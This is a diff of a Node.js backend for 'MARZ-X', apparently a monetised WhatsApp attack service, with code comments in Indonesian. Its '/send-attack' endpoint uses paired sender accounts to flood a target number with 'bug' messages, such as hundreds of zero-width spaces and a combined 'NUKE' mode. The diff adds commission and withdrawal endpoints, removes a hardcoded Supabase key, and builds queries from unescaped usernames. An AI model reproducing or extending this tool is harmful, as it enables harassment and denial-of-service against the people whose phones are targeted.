@@ -1,7 +1,6 @@
-// =================================================================
-// MARZ-X BACKEND — WhatsApp Bug + Tools + Sender + Supabase
-// =================================================================
-
+// ================================================================
+// MARZ-X BACKEND — LENGKAP (Bug, Tools, Sender, Withdraw)
+// ================================================================
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
@@ -13,26 +12,29 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// =================================================================
+// ================================================================
 // KONFIGURASI SUPABASE
-// =================================================================
-const SUPABASE_URL = process.env.SUPABASE_URL || 'https://nxihknuzzmqbdcazikln.supabase.co';
-const SUPABASE_KEY = process.env.SUPABASE_KEY || 'sb_publishable_NnBJVtkGKDp1ZhLVYpxKXg_KMCK9EvO';
+// ================================================================
+const SUPABASE_URL = process.env.SUPABASE_URL;
+const SUPABASE_KEY = process.env.SUPABASE_KEY;
+if (!SUPABASE_URL || !SUPABASE_KEY) {
+  console.error('❌ SUPABASE_URL dan SUPABASE_KEY wajib diisi di .env');
+  process.exit(1);
+}
+
 const supabaseHeaders = {
   'apikey': SUPABASE_KEY,
   'Authorization': 'Bearer ' + SUPABASE_KEY,
   'Content-Type': 'application/json'
 };
 
-// =================================================================
+// ================================================================
 // WHATSAPP CLIENT MANAGER (Multi-akun sender)
-// =================================================================
+// ================================================================
 const clients = {};
 
 async function getWhatsAppClient(senderNumber) {
-  if (clients[senderNumber]) {
-    return clients[senderNumber];
-  }
+  if (clients[senderNumber]) return clients[senderNumber];
 
   const client = new Client({
     authStrategy: new LocalAuth({ clientId: senderNumber }),
@@ -49,7 +51,6 @@ async function getWhatsAppClient(senderNumber) {
 
   client.on('ready', () => {
     console.log(`✅ Bot ${senderNumber} siap!`);
-    // Update status sender di Supabase
     updateSenderStatus(senderNumber, 'active');
   });
 
@@ -73,7 +74,7 @@ async function updateSenderStatus(senderNumber, status) {
   try {
     await axios.patch(
       `${SUPABASE_URL}/rest/v1/whatsapp_senders?phone_number=eq.${senderNumber}`,
-      { status: status, last_pairing: new Date().toISOString() },
+      { status, last_pairing: new Date().toISOString() },
       { headers: supabaseHeaders }
     );
   } catch (e) {
@@ -81,19 +82,15 @@ async function updateSenderStatus(senderNumber, status) {
   }
 }
 
-// =================================================================
-// FUNGSI BANTU
-// =================================================================
 function delay(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-// =================================================================
+// ================================================================
 // ENDPOINT: SEND ATTACK (WHATSAPP BUG)
-// =================================================================
+// ================================================================
 app.post('/send-attack', async (req, res) => {
   const { sender, target, bug, username } = req.body;
-
   if (!sender || !target || !bug) {
     return res.status(400).json({ success: false, message: 'Data tidak lengkap (sender, target, bug)' });
   }
@@ -101,8 +98,6 @@ app.post('/send-attack', async (req, res) => {
   try {
     const client = await getWhatsAppClient(sender);
     const chatId = target.includes('@c.us') ? target : target + '@c.us';
-
-    // Log eksekusi
     console.log(`🔥 [${username}] Serangan ${bug} dari ${sender} ke ${target}`);
 
     switch (bug) {
@@ -122,7 +117,7 @@ app.post('/send-attack', async (req, res) => {
 
       case 'BLANK HARD':
         for (let i = 0; i < 300; i++) {
-          await client.sendMessage(chatId, '\u200B'); // zero-width space
+          await client.sendMessage(chatId, '\u200B');
           if (i % 50 === 0) await delay(1000);
         }
         break;
@@ -165,7 +160,6 @@ app.post('/send-attack', async (req, res) => {
 
       case 'NUKE':
         await client.sendMessage(chatId, '☢️ NUKE DIMULAI — Kombinasi total!');
-        // Gabungan semua
         for (let i = 0; i < 100; i++) {
           await client.sendMessage(chatId, '\u200B');
           await delay(50);
@@ -197,18 +191,16 @@ app.post('/send-attack', async (req, res) => {
   }
 });
 
-// =================================================================
+// ================================================================
 // ENDPOINT: RUN TOOL
-// =================================================================
+// ================================================================
 app.post('/run-tool', async (req, res) => {
   const { tool, target, username } = req.body;
-
   if (!tool || !target) {
     return res.status(400).json({ success: false, message: 'Data tidak lengkap (tool, target)' });
   }
 
   console.log(`🛠️ [${username}] Menjalankan tool ${tool} ke ${target}`);
-
   let result = '';
 
   switch (tool) {
@@ -234,12 +226,12 @@ app.post('/run-tool', async (req, res) => {
       return res.status(400).json({ success: false, message: 'Tool tidak dikenal' });
   }
 
-  res.json({ success: true, result: result });
+  res.json({ success: true, result });
 });
 
-// =================================================================
+// ================================================================
 // ENDPOINT: SENDER STATUS
-// =================================================================
+// ================================================================
 app.get('/sender-status/:username', async (req, res) => {
   const { username } = req.params;
   try {
@@ -253,25 +245,22 @@ app.get('/sender-status/:username', async (req, res) => {
   }
 });
 
-// =================================================================
-// ENDPOINT: PAIRING (Simpan sender ke Supabase)
-// =================================================================
+// ================================================================
+// ENDPOINT: SENDER PAIR
+// ================================================================
 app.post('/sender-pair', async (req, res) => {
   const { username, phoneNumber, method } = req.body;
-
   if (!username || !phoneNumber) {
     return res.status(400).json({ success: false, message: 'Username dan phoneNumber wajib diisi' });
   }
 
   try {
-    // Cek apakah sudah ada
     const existing = await axios.get(
       `${SUPABASE_URL}/rest/v1/whatsapp_senders?username=eq.${username}`,
       { headers: supabaseHeaders }
     );
 
     if (existing.data && existing.data.length > 0) {
-      // Update
       await axios.patch(
         `${SUPABASE_URL}/rest/v1/whatsapp_senders?username=eq.${username}`,
         {
@@ -283,11 +272,10 @@ app.post('/sender-pair', async (req, res) => {
         { headers: supabaseHeaders }
       );
     } else {
-      // Insert
       await axios.post(
         `${SUPABASE_URL}/rest/v1/whatsapp_senders`,
         {
-          username: username,
+          username,
           phone_number: phoneNumber,
           method: method || 'pairing',
           status: 'pending',
@@ -297,15 +285,12 @@ app.post('/sender-pair', async (req, res) => {
       );
     }
 
-    // Generate kode 8 digit
     const code = Math.random().toString(36).substring(2, 10).toUpperCase();
-
-    // Inisialisasi client (agar QR muncul)
     await getWhatsAppClient(phoneNumber);
 
     res.json({
       success: true,
-      code: code,
+      code,
       message: 'Sender tersimpan. Scan QR atau masukkan kode pairing di WhatsApp.'
     });
 
@@ -315,9 +300,100 @@ app.post('/sender-pair', async (req, res) => {
   }
 });
 
-// =================================================================
+// ================================================================
+// ENDPOINT: CEK SALDO KOMISI
+// ================================================================
+app.get('/commission-balance/:username', async (req, res) => {
+  const { username } = req.params;
+  try {
+    const response = await axios.get(
+      `${SUPABASE_URL}/rest/v1/users?username=eq.${username}&select=commission_balance,total_commission`,
+      { headers: supabaseHeaders }
+    );
+    if (response.data && response.data.length > 0) {
+      res.json({
+        commission_balance: response.data[0].commission_balance || 0,
+        total_commission: response.data[0].total_commission || 0
+      });
+    } else {
+      res.status(404).json({ error: 'User tidak ditemukan' });
+    }
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// ================================================================
+// ENDPOINT: PENARIKAN SALDO (WITHDRAW)
+// ================================================================
+app.post('/withdraw', async (req, res) => {
+  const { username, amount, method, bankName, accountNumber, accountName } = req.body;
+
+  // Validasi input
+  if (!username || !amount || amount < 50000) {
+    return res.status(400).json({
+      success: false,
+      message: 'Username dan nominal minimal Rp 50.000 wajib diisi.'
+    });
+  }
+
+  try {
+    // 1. Ambil saldo komisi user
+    const userResp = await axios.get(
+      `${SUPABASE_URL}/rest/v1/users?username=eq.${username}&select=commission_balance`,
+      { headers: supabaseHeaders }
+    );
+    if (!userResp.data || userResp.data.length === 0) {
+      return res.status(404).json({ success: false, message: 'User tidak ditemukan' });
+    }
+    const currentBalance = userResp.data[0].commission_balance || 0;
+
+    if (currentBalance < amount) {
+      return res.status(400).json({
+        success: false,
+        message: `Saldo tidak mencukupi. Saldo Anda: Rp ${currentBalance.toLocaleString()}`
+      });
+    }
+
+    // 2. Insert ke tabel withdrawals dengan status PENDING
+    const withdrawResp = await axios.post(
+      `${SUPABASE_URL}/rest/v1/withdrawals`,
+      {
+        user_id: username,
+        amount: amount,
+        status: 'PENDING',
+        bank_name: bankName || null,
+        account_number: accountNumber || null,
+        account_name: accountName || null,
+        created_at: new Date().toISOString()
+      },
+      { headers: supabaseHeaders }
+    );
+
+    // 3. Kurangi commission_balance user
+    await axios.patch(
+      `${SUPABASE_URL}/rest/v1/users?username=eq.${username}`,
+      {
+        commission_balance: currentBalance - amount
+      },
+      { headers: supabaseHeaders }
+    );
+
+    res.json({
+      success: true,
+      message: 'Permintaan penarikan berhasil diajukan. Menunggu verifikasi.',
+      withdrawal_id: withdrawResp.data[0]?.id || null
+    });
+
+  } catch (error) {
+    console.error('Error withdraw:', error);
+    res.status(500).json({ success: false, message: error.message });
+  }
+});
+
+// ================================================================
 // ENDPOINT: HEALTH CHECK
-// =================================================================
+// ================================================================
 app.get('/', (req, res) => {
   res.json({
     status: '🚀 MARZ-X Backend running',
@@ -325,14 +401,16 @@ app.get('/', (req, res) => {
       '/send-attack': 'POST - Kirim serangan bug',
       '/run-tool': 'POST - Jalankan tools',
       '/sender-status/:username': 'GET - Cek status sender',
-      '/sender-pair': 'POST - Pairing sender'
+      '/sender-pair': 'POST - Pairing sender',
+      '/commission-balance/:username': 'GET - Cek saldo komisi',
+      '/withdraw': 'POST - Ajukan penarikan saldo (min 50k)'
     }
   });
 });
 
-// =================================================================
+// ================================================================
 // START SERVER
-// =================================================================
+// ================================================================
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`🚀 MARZ-X Backend running on port ${PORT}`);
